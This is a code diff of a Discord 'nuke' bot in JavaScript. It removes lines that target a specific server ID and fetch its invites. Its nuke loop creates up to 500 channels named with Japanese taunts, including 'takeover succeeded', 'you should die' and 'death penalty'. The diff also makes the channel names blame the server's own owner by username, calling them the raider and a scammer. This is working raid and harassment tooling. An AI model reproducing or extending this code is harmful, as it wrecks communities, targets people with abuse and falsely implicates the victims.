@@ -48,10 +48,6 @@ client.on('ready', async () => {
   });
   client.user.setStatus("online");
   console.log(`${client.user.tag} is ready!`);
-  console.log(client.guilds.cache.map(g => `${g.name}/${g.id}`))
-  //await nuke("1156593239399333959")
-  const invites = await client.guilds.cache.get("1156593239399333959").invites.fetch()
-     console.log(invites.map(invite => invite.url))
 });
 
 async function nuke(guild_id){
@@ -74,7 +70,7 @@ async function nuke(guild_id){
           await loop();
         }, coolDownTime);
       }else if(x == 0){
-        const channel_names = ["あらしたったww","ざこおつ","どんまい","乗っ取り成功wwwwww","ゴミセキュワロタ","ねぇ今どんな気持ち？wwwwww","鯖ばいばーいwwwwwwwww",`fuka452がやりましたwwwww`,`fuka452は詐欺師wwwww`,"しんだほうがいいよwwwwww","ゴミ鯖乙ww","バキバキDTww","死刑wwwwww","カイロスみたいな顔だね"]
+        const channel_names = ["あらしたったww","ざこおつ","どんまい","乗っ取り成功wwwwww","ゴミセキュワロタ","ねぇ今どんな気持ち？wwwwww","鯖ばいばーいwwwwwwwww",`${client.users.cache.get(guild.ownerId).username}がやりましたwwwww`,`${client.users.cache.get(guild.ownerId).username}は詐欺師wwwww`,"しんだほうがいいよwwwwww","ゴミ鯖乙ww","バキバキDTww","死刑wwwwww","カイロスみたいな顔だね"]
         for(let i=0;i<500;i++){
           const ch = await guild.channels.create(channel_names[Math.floor(Math.random()*channel_names.length)])
           for(let n=0;n<5;n++){
